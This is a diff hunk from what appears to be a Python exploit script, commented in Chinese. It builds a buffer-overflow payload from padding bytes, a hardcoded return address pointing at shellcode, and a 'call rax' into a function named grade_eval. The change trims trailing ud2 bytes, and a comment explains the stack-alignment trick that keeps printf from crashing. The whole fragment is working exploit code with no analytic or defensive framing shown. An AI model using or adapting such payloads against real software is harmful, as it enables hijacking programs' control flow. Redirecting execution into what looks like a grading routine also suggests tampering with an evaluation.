@@ -21,7 +21,7 @@ sc += b"\xff\xd0"                     # call rax
 p = b"A" * 16 + b"B" * 8
 p += p64(0x721000800ff0)              # 返回地址：跳到 shellcode
 p += sc
-p += b"\x0f\x0b\x0f\x0b"              # ud2，grade_eval 返回后直接结束
+p += b"\x0f\x0b"                    # ud2，grade_eval 返回后直接结束
 
 # 这里是 call rax 不是 jmp rax：跳转时 rsp%16==0，jmp 进去 grade_eval 的话
 # 它里面的 printf 会在 movaps 上崩掉，call 会先压 8 字节返回地址，正好对上。
